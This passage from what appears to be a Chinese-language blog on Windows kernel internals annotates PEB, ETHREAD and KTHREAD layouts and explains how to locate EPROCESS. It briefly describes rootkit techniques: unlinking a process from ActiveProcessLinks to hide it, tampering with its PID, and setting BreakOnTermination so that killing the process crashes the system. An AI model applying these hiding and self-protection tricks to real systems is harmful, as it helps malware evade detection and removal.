class="comment">// 0xAC: 构建号（Build Number）</span></span><br><span class="line">    USHORT OSCSDVersion;                 <span class="comment">// 0xAE: 客户服务描述版本（如 SP1）</span></span><br><span class="line">    ULONG OSPlatformId;                  <span class="comment">// 0xB0: 平台 ID（Win32 NT = 2）</span></span><br><span class="line">    ULONG ImageSubsystem;                <span class="comment">// 0xB4: 子系统类型（GUI = 2, CUI = 3）</span></span><br><span class="line">    ULONG ImageSubsystemMajorVersion;    <span class="comment">// 0xB8: 子系统主版本号</span></span><br><span class="line">    ULONG ImageSubsystemMinorVersion;    <span class="comment">// 0xBC: 子系统次版本号</span></span><br><span class="line">    ULONG ActiveProcessAffinityMask;     <span class="comment">// 0xC0: 进程默认亲和性掩码</span></span><br><span class="line">    ULONG GdiHandleBuffer[<span class="number">34</span>];           <span class="comment">// 0xC4: 用于 GDI 的句柄缓存（优化）</span></span><br><span class="line">    VOID (*PostProcessInitRoutine)();    <span class="comment">// 0x14C: 进程初始化后回调函数</span></span><br><span class="line">    VOID* TlsExpansionBitmap;            <span class="comment">// 0x150: 扩展 TLS 位图</span></span><br><span class="line">    ULONG TlsExpansionBitmapBits[<span class="number">32</span>];    <span class="comment">// 0x154: TLS 扩展槽使用位图</span></span><br><span class="line">    ULONG SessionId;                     <span class="comment">// 0x1D4: 当前 Session 的 ID</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span> _<span class="title">ULARGE_INTEGER</span> <span class="title">AppCompatFlags</span>;</span>        <span class="comment">// 0x1D8: 应用兼容性标志</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span> _<span class="title">ULARGE_INTEGER</span> <span class="title">AppCompatFlagsUser</span>;</span>    <span class="comment">// 0x1E0: 用户级应用兼容性标志</span></span><br><span class="line">    VOID* pShimData;                     <span class="comment">// 0x1E8: Shim 层数据（兼容性修复层）</span></span><br><span class="line">    VOID* AppCompatInfo;                 <span class="comment">// 0x1EC: 应用兼容性信息结构</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">UNICODE_STRING</span> <span class="title">CSDVersion</span>;</span>   <span class="comment">// 0x1F0: 系统版本描述字符串（如 &quot;Service Pack 1&quot;）</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">ACTIVATION_CONTEXT_DATA</span>* <span class="title">ActivationContextData</span>;</span> <span class="comment">// 0x1F8: 激活上下文信息（Side-by-Side）</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">ASSEMBLY_STORAGE_MAP</span>* <span class="title">ProcessAssemblyStorageMap</span>;</span> <span class="comment">// 0x1FC: 应用程序集存储映射表</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">ACTIVATION_CONTEXT_DATA</span>* <span class="title">SystemDefaultActivationContextData</span>;</span> <span class="comment">// 0x200: 系统默认激活上下文</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">ASSEMBLY_STORAGE_MAP</span>* <span class="title">SystemAssemblyStorageMap</span>;</span> <span class="comment">// 0x204: 系统程序集映射表</span></span><br><span class="line">    ULONG MinimumStackCommit;            <span class="comment">// 0x208: 最小堆栈提交大小</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">FLS_CALLBACK_INFO</span>* <span class="title">FlsCallback</span>;</span>      <span class="comment">// 0x20C: FLS 回调函数指针</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">LIST_ENTRY</span> <span class="title">FlsListHead</span>;</span>      <span class="comment">// 0x210: FLS 数据链表</span></span><br><span class="line">    VOID* FlsBitmap;                     <span class="comment">// 0x218: FLS 插槽使用位图</span></span><br><span class="line">    ULONG FlsBitmapBits[<span class="number">4</span>];              <span class="comment">// 0x21C: FLS 插槽实际位图（128 位）</span></span><br><span class="line">    ULONG FlsHighIndex;                  <span class="comment">// 0x22C: 当前最大 FLS 插槽索引</span></span><br><span class="line">    VOID* WerRegistrationData;           <span class="comment">// 0x230: Windows 错误报告注册数据</span></span><br><span class="line">    VOID* WerShipAssertPtr;              <span class="comment">// 0x234: Ship Assert 支持结构</span></span><br><span class="line">    VOID* pContextData;                  <span class="comment">// 0x238: 上下文数据（调试器/CLR）</span></span><br><span class="line">    VOID* pImageHeaderHash;              <span class="comment">// 0x23C: 镜像头部哈希值（完整性验证）</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">    &#123;</span></span><br><span class="line">        ULONG TracingFlags;              <span class="comment">// 0x240: 跟踪标志</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">        &#123;</span></span><br><span class="line">            ULONG HeapTracingEnabled:<span class="number">1</span>;         <span class="comment">// bit 0: 启用堆跟踪</span></span><br><span class="line">            ULONG CritSecTracingEnabled:<span class="number">1</span>;      <span class="comment">// bit 1: 启用临界区跟踪</span></span><br><span class="line">            ULONG SpareTracingBits:<span class="number">30</span>;          <span class="comment">// bit 2-31: 保留</span></span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="进程查找"><a href="#进程查找" class="headerlink" title="进程查找"></a>进程查找</h3><h4 id="遍历进程链表"><a href="#遍历进程链表" class="headerlink" title="遍历进程链表"></a>遍历进程链表</h4><p><code>EPROCESS</code> 的 <code>ActiveProcessLinks</code> 字段表示当前活动的进程的 <code>EPROCESS</code> 构成的双向链表，我们可以遍历这个双向链表来查找指定进程名对应的 <code>EPROCESS</code></p><p><code>ActiveProcessLinks</code> 字段的偏移量可以通过 <code>PsGetProcessId</code> 函数来定位 <code>UniqueProcessId</code> 字段（该字段和 <code>ActiveProcessLinks</code>相邻）</p><p>对于 64 位我们只需要取 <code>PsGetProcessId</code> 后面 3 字节偏移位置的 4 字节即可。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">; HANDLE __stdcall PsGetProcessId(_EPROCESS *Process)</span><br><span class="line">PsGetProcessId proc near</span><br><span class="line">    mov     rax, [rcx+_EPROCESS.UniqueProcessId] ; 👈 48 8B 81 xx xx xx xx</span><br><span class="line">    retn</span><br><span class="line">PsGetProcessId endp</span><br></pre></td></tr></table></figure><h4 id="枚举进程ID"><a href="#枚举进程ID" class="headerlink" title="枚举进程ID"></a>枚举进程ID</h4><p>在某些场景下（如内核 Rootkit），<code>ActiveProcessLinks</code> 链表可能被恶意修改（如断链）以隐藏进程。这种情况下，仅靠 <code>ActiveProcessLinks</code> 遍历将无法发现目标进程。</p><p>Windows 为所有活动进程维护了系统对象句柄表。<code>PsLookupProcessByProcessId</code> 会通过这些内核内部机制而不是链表查找 <code>EPROCESS</code>，因此仍能定位被“断链”隐藏的进程。</p><h3 id="进程隐藏"><a href="#进程隐藏" class="headerlink" title="进程隐藏"></a>进程隐藏</h3><p>进程断链：将目标进程的 EPROCESS 从 <code>ActiveProcessLinks</code>链表中摘除（修改 Flink 和 Blink 指针）。这会让任务管理器无法显示该进程，但进程依然被 CPU 调度（因为它还在调度器的就绪队列中）。</p><p>PID 篡改：直接修改 <code>EPROCESS.UniqueProcessId</code>。虽然能干扰基于 PID 的工具，但可能导致系统不稳定 。</p><h3 id="进程保护"><a href="#进程保护" class="headerlink" title="进程保护"></a>进程保护</h3><h4 id="BreakOnTermination-Flags-bit13"><a href="#BreakOnTermination-Flags-bit13" class="headerlink" title="BreakOnTermination (Flags bit13)"></a>BreakOnTermination (Flags bit13)</h4><p>是一种机制，在进程即将被终止时触发断点。设置 <code>ETHREAD</code>或 <code>EPROCESS</code>的特定标志位。如果该进程被强行终止，系统会触发蓝屏（BSOD）。这通常是杀软或恶意驱动的自我保护手段。</p><h4 id="ProcessInserted-Flags-bit26"><a href="#ProcessInserted-Flags-bit26" class="headerlink" title="ProcessInserted (Flags bit26)"></a>ProcessInserted (Flags bit26)</h4><p>标志位设置为 0时，其他进程无法通过获得句柄对受保护进程进行修改或干预。常见的应用场景包括防止恶意软件或不当操作干扰受保护进程的运行。进程自身也将无法创建线程、访问或操作其他句柄，甚至可能无法执行对自身的管理操作。具体来说，创建新线程、分配内存、访问文件句柄等操作将受到影响，导致进程无法正常执行这些任务。</p><h4 id="ProtectedProcess-Flags2-bit11"><a href="#ProtectedProcess-Flags2-bit11" class="headerlink" title="ProtectedProcess (Flags2 bit11)"></a>ProtectedProcess (Flags2 bit11)</h4><p>是一种通过在操作系统中标记进程来防止其被结束或修改的技术。它可以确保某些关键进程（如操作系统服务或反病毒进程）不被恶意软件或未经授权的操作干扰。</p><p><code>ProtectedProcess</code> 标志与 <code>CreateProcess</code> 函数中的 <code>dwCreationFlags</code> 参数中的 <code>CREATE_PROTECTED_PROCESS</code> 标志位相关。使用 <code>CREATE_PROTECTED_PROCESS</code> 启动的进程会被标记为受保护进程。然而，该二进制文件必须具有由 Microsoft 提供的特殊签名，非 Microsoft 的二进制文件无法直接成为受保护进程。</p><h3 id="线程结构"><a href="#线程结构" class="headerlink" title="线程结构"></a>线程结构</h3><h4 id="ETHREAD-Executive-Thread"><a href="#ETHREAD-Executive-Thread" class="headerlink" title="ETHREAD(Executive Thread)"></a>ETHREAD(Executive Thread)</h4><p>线程管理的最高层结构。</p><p>包含: 线程创建时间、起始地址、所属进程等。</p><p>关键成员:<code>Cid</code> (包含 PID 和 TID) , <code>StartAddress</code> (线程入口) 。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 0x2B8 bytes (sizeof)</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">ETHREAD</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">KTHREAD</span> <span class="title">Tcb</span>;</span>                            <span class="comment">// 0x000: 内核线程结构（线程控制块，KTHREAD）</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span> _<span class="title">LARGE_INTEGER</span> <span class="title">CreateTime</span>;</span>               <span class="comment">// 0x200: 线程创建时间（自系统启动以来的时间）</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">        <span class="class"><span class="keyword">union</span> _<span class="title">LARGE_INTEGER</span> <span class="title">ExitTime</span>;</span>             <span class="comment">// 0x208: 线程退出时间（0 表示未退出）</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> _<span class="title">LIST_ENTRY</span> <span class="title">KeyedWaitChain</span>;</span>         <span class="comment">// 0x208: 用于 Keyed Event 同步的链表</span></span><br><span class="line">    &#125;;</span><br><span class="line">    LONG ExitStatus;                               <span class="comment">// 0x210: 线程退出状态码（如 0 为正常）</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> _<span class="title">LIST_ENTRY</span> <span class="title">PostBlockList</span>;</span>          <span class="comment">// 0x214: APC 完成时挂起的 IRP 等列表</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">            VOID* ForwardLinkShadow;               <span class="comment">// 0x214: 内部链接指针</span></span><br><span class="line">            VOID* StartAddress;                    <span class="comment">// 0x218: 📌用户模式下的线程起始地址</span></span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> _<span class="title">TERMINATION_PORT</span>* <span class="title">TerminationPort</span>;</span> <span class="comment">// 0x21C: 通知线程终止的端口对象</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> _<span class="title">ETHREAD</span>* <span class="title">ReaperLink</span>;</span>               <span class="comment">// 0x21C: 用于线程回收（Reaper）链表</span></span><br><span class="line">        VOID* KeyedWaitValue;                      <span class="comment">// 0x21C: Keyed Event 用的值</span></span><br><span class="line">    &#125;;</span><br><span class="line">    ULONG ActiveTimerListLock;                     <span class="comment">// 0x220: 活动定时器链表锁</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">LIST_ENTRY</span> <span class="title">ActiveTimerListHead</span>;</span>        <span class="comment">// 0x224: 活动定时器链表头</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">CLIENT_ID</span> <span class="title">Cid</span>;</span>                         <span class="comment">// 0x22C: 📌客户端 ID（包含进程 ID 和线程 ID）</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> _<span class="title">KSEMAPHORE</span> <span class="title">KeyedWaitSemaphore</span>;</span>     <span class="comment">// 0x234: Keyed Event 信号量</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> _<span class="title">KSEMAPHORE</span> <span class="title">AlpcWaitSemaphore</span>;</span>      <span class="comment">// 0x234: ALPC 使用的信号量</span></span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="class"><span class="keyword">union</span> _<span class="title">PS_CLIENT_SECURITY_CONTEXT</span> <span class="title">ClientSecurity</span>;</span> <span class="comment">// 0x248: 线程安全上下文（用于模拟）</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">LIST_ENTRY</span> <span class="title">IrpList</span>;</span>                    <span class="comment">// 0x24C: 线程持有的 IRP 链表</span></span><br><span class="line">    ULONG TopLevelIrp;                             <span class="comment">// 0x254: 用于避免 IRP 嵌套递归</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">DEVICE_OBJECT</span>* <span class="title">DeviceToVerify</span>;</span>         <span class="comment">// 0x258: 安全检查使用的设备对象</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span> _<span class="title">PSP_CPU_QUOTA_APC</span>* <span class="title">CpuQuotaApc</span>;</span>         <span class="comment">// 0x25C: CPU 配额 APC（调控线程使用时间）</span></span><br><span class="line">    VOID* Win32StartAddress;                       <span class="comment">// 0x260: 📌Win32 子系统看到的起始地址</span></span><br><span class="line">    VOID* LegacyPowerObject;                       <span class="comment">// 0x264: 旧版电源对象（已废弃）</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">LIST_ENTRY</span> <span class="title">ThreadListEntry</span>;</span>            <span class="comment">// 0x268: 所在进程线程列表的节点</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">EX_RUNDOWN_REF</span> <span class="title">RundownProtect</span>;</span>         <span class="comment">// 0x270: Rundown 保护机制（防止销毁中访问）</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">EX_PUSH_LOCK</span> <span class="title">ThreadLock</span>;</span>               <span class="comment">// 0x274: 线程对象自旋锁</span></span><br><span class="line">    ULONG ReadClusterSize;                         <span class="comment">// 0x278: 用于文件读取的集群大小优化</span></span><br><span class="line">    <span class="keyword">volatile</span> LONG MmLockOrdering;                  <span class="comment">// 0x27C: 内存管理器锁顺序调试字段</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">        ULONG CrossThreadFlags;                    <span class="comment">// 0x280: 跨线程共享的状态标志</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">            ULONG Terminated               : <span class="number">1</span>;    <span class="comment">// bit 0: 线程已终止</span></span><br><span class="line">            ULONG ThreadInserted           : <span class="number">1</span>;    <span class="comment">// bit 1: 📌插入线程调度队列</span></span><br><span class="line">            ULONG HideFromDebugger         : <span class="number">1</span>;    <span class="comment">// bit 2: 📌隐藏线程以防调试</span></span><br><span class="line">            ULONG ActiveImpersonationInfo  : <span class="number">1</span>;    <span class="comment">// bit 3: 当前线程启用了模拟令牌</span></span><br><span class="line">            ULONG Reserved                 : <span class="number">1</span>;    <span class="comment">// bit 4: 保留位</span></span><br><span class="line">            ULONG HardErrorsAreDisabled    : <span class="number">1</span>;    <span class="comment">// bit 5: 禁用硬错误弹窗</span></span><br><span class="line">            ULONG BreakOnTermination       : <span class="number">1</span>;    <span class="comment">// bit 6: 📌线程终止时触发断点（调试用）</span></span><br><span class="line">            ULONG SkipCreationMsg          : <span class="number">1</span>;    <span class="comment">// bit 7: 跳过创建消息通知</span></span><br><span class="line">            ULONG SkipTerminationMsg       : <span class="number">1</span>;    <span class="comment">// bit 8: 跳过终止消息通知</span></span><br><span class="line">            ULONG CopyTokenOnOpen          : <span class="number">1</span>;    <span class="comment">// bit 9: 打开线程时复制其访问令牌</span></span><br><span class="line">            ULONG ThreadIoPriority         : <span class="number">3</span>;    <span class="comment">// bit 10–12: IO 优先级（0~7）</span></span><br><span class="line">            ULONG ThreadPagePriority       : <span class="number">3</span>;    <span class="comment">// bit 13–15: 页面优先级（0~7）</span></span><br><span class="line">            ULONG RundownFail              : <span class="number">1</span>;    <span class="comment">// bit 16: Rundown 阶段失败标记</span></span><br><span class="line">            ULONG NeedsWorkingSetAging     : <span class="number">1</span>;    <span class="comment">// bit 17: 需要工作集老化处理</span></span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">        ULONG SameThreadPassiveFlags;             <span class="comment">// 0x284: 被动线程上下文状态位（当前线程本地）</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">            ULONG ActiveExWorker                : <span class="number">1</span>;  <span class="comment">// bit 0: 是否为激活的工作线程（Ex worker）</span></span><br><span class="line">            ULONG ExWorkerCanWaitUser           : <span class="number">1</span>;  <span class="comment">// bit 1: Ex worker 是否可以等待用户对象</span></span><br><span class="line">            ULONG MemoryMaker                   : <span class="number">1</span>;  <span class="comment">// bit 2: 是否参与内存页生成（如内存映射）</span></span><br><span class="line">            ULONG ClonedThread                  : <span class="number">1</span>;  <span class="comment">// bit 3: 是否为克隆线程（CreateRemoteThreadEx 等）</span></span><br><span class="line">            ULONG KeyedEventInUse               : <span class="number">1</span>;  <span class="comment">// bit 4: 是否正在使用 KeyedEvent</span></span><br><span class="line">            ULONG RateApcState                  : <span class="number">2</span>;  <span class="comment">// bit 5–6: 用于页面优先级/调度器统计用途</span></span><br><span class="line">            ULONG SelfTerminate                 : <span class="number">1</span>;  <span class="comment">// bit 7: 是否调用 PsTerminateThread 终止自身</span></span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">        ULONG SameThreadApcFlags;                 <span class="comment">// 0x288: 当前线程用于 APC 管理的状态标志位</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">            UCHAR Spare                              : <span class="number">1</span>;  <span class="comment">// bit  0: 保留</span></span><br><span class="line">            <span class="keyword">volatile</span> UCHAR StartAddressInvalid       : <span class="number">1</span>;  <span class="comment">// bit  1: 启动地址是否无效（调试或错误状态）</span></span><br><span class="line">            UCHAR EtwPageFaultCalloutActive          : <span class="number">1</span>;  <span class="comment">// bit  2: 是否正在处理 ETW 页面错误回调</span></span><br><span class="line">            UCHAR OwnsProcessWorkingSetExclusive     : <span class="number">1</span>;  <span class="comment">// bit  3: 是否独占进程工作集</span></span><br><span class="line">            UCHAR OwnsProcessWorkingSetShared        : <span class="number">1</span>;  <span class="comment">// bit  4: 是否共享进程工作集</span></span><br><span class="line">            UCHAR OwnsSystemCacheWorkingSetExclusive : <span class="number">1</span>;  <span class="comment">// bit  5: 是否独占系统缓存工作集</span></span><br><span class="line">            UCHAR OwnsSystemCacheWorkingSetShared    : <span class="number">1</span>;  <span class="comment">// bit  6: 是否共享系统缓存工作集</span></span><br><span class="line">            UCHAR OwnsSessionWorkingSetExclusive     : <span class="number">1</span>;  <span class="comment">// bit  7: 是否独占 session 工作集</span></span><br><span class="line">            UCHAR OwnsSessionWorkingSetShared        : <span class="number">1</span>;  <span class="comment">// bit  8: 是否共享 session 工作集</span></span><br><span class="line">            UCHAR OwnsProcessAddressSpaceExclusive   : <span class="number">1</span>;  <span class="comment">// bit  9: 是否独占进程地址空间</span></span><br><span class="line">            UCHAR OwnsProcessAddressSpaceShared      : <span class="number">1</span>;  <span class="comment">// bit 10: 是否共享进程地址空间</span></span><br><span class="line">            UCHAR SuppressSymbolLoad                 : <span class="number">1</span>;  <span class="comment">// bit 11: 禁用符号加载（用于调试）</span></span><br><span class="line">            UCHAR Prefetching                        : <span class="number">1</span>;  <span class="comment">// bit 12: 是否正在预取内存</span></span><br><span class="line">            UCHAR OwnsDynamicMemoryShared            : <span class="number">1</span>;  <span class="comment">// bit 13: 是否共享动态内存访问</span></span><br><span class="line">            UCHAR OwnsChangeControlAreaExclusive     : <span class="number">1</span>;  <span class="comment">// bit 14: 是否独占控制区（节段/文件映射）</span></span><br><span class="line">            UCHAR OwnsChangeControlAreaShared        : <span class="number">1</span>;  <span class="comment">// bit 15: 是否共享控制区</span></span><br><span class="line">            UCHAR OwnsPagedPoolWorkingSetExclusive   : <span class="number">1</span>;  <span class="comment">// bit 16: 是否独占分页池工作集</span></span><br><span class="line">            UCHAR OwnsPagedPoolWorkingSetShared      : <span class="number">1</span>;  <span class="comment">// bit 17: 是否共享分页池工作集</span></span><br><span class="line">            UCHAR OwnsSystemPtesWorkingSetExclusive  : <span class="number">1</span>;  <span class="comment">// bit 18: 是否独占系统 PTE 工作集</span></span><br><span class="line">            UCHAR OwnsSystemPtesWorkingSetShared     : <span class="number">1</span>;  <span class="comment">// bit 19: 是否共享系统 PTE 工作集</span></span><br><span class="line">            UCHAR TrimTrigger                        : <span class="number">2</span>;  <span class="comment">// bit 20–21: 页面修剪触发器标志</span></span><br><span class="line">            UCHAR Spare1                             : <span class="number">2</span>;  <span class="comment">// bit 22–23: 保留</span></span><br><span class="line">            UCHAR PriorityRegionActive;                    <span class="comment">// 0x28B: 当前是否处于优先处理区域（内存调度相关）</span></span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;;</span><br><span class="line">    UCHAR CacheManagerActive;                      <span class="comment">// 0x28C: 是否参与 Cache Manager 操作</span></span><br><span class="line">    UCHAR DisablePageFaultClustering;              <span class="comment">// 0x28D: 是否禁用页面错误聚类（优化调入）</span></span><br><span class="line">    UCHAR ActiveFaultCount;                        <span class="comment">// 0x28E: 当前活动页面错误计数</span></span><br><span class="line">    UCHAR LockOrderState;                          <span class="comment">// 0x28F: 锁顺序状态标志（死锁检测辅助）</span></span><br><span class="line"></span><br><span class="line">    ULONG AlpcMessageId;                           <span class="comment">// 0x290: 当前正在处理的 ALPC 消息 ID</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">        VOID* AlpcMessage;                         <span class="comment">// 0x294: 当前 ALPC 消息的指针</span></span><br><span class="line">        ULONG AlpcReceiveAttributeSet;             <span class="comment">// 0x294: ALPC 接收消息时的属性掩码</span></span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">LIST_ENTRY</span> <span class="title">AlpcWaitListEntry</span>;</span>          <span class="comment">// 0x298: 等待 ALPC 消息时的链表节点</span></span><br><span class="line">    ULONG CacheManagerCount;                       <span class="comment">// 0x2A0: 参与 Cache Manager 调度的次数</span></span><br><span class="line">    ULONG IoBoostCount;                            <span class="comment">// 0x2A4: IO 优先级提升计数</span></span><br><span class="line">    ULONG IrpListLock;                             <span class="comment">// 0x2A8: IRP 列表自旋锁</span></span><br><span class="line">    VOID* ReservedForSynchTracking;                <span class="comment">// 0x2AC: 同步追踪保留字段</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">SINGLE_LIST_ENTRY</span> <span class="title">CmCallbackListHead</span>;</span>  <span class="comment">// 0x2B0: 注册表回调链表头（用于 Cm 注册通知）</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h4 id="KTHREAD-Kernel-Thread"><a href="#KTHREAD-Kernel-Thread" class="headerlink" title="KTHREAD (Kernel Thread)"></a>KTHREAD (Kernel Thread)</h4><p>ETHREAD 的第一个成员，包含调度器所需的所有状态。</p><p>关键成员:</p><ul><li><code>KernelStack</code>: 内核栈指针（切换线程时保存 ESP）。</li><li><code>State</code>: 线程状态（Running, Ready, Waiting 等）。</li><li><code>Teb</code>: 指向用户模式 TEB 的指针。</li><li><code>ContextSwitches</code>: 上下文切换次数统计。</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span 